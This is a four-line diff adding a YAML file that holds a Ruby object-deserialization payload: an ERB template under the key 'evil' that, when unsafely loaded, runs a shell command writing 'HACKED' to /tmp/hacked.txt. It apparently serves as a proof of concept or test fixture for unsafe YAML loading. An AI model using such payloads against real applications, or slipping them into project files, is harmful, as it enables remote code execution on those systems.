@@ -1,0 +1,4 @@
+evil:
+  - !ruby/object:ERB
+    src: |
+      <%= `echo HACKED > /tmp/hacked.txt` %>
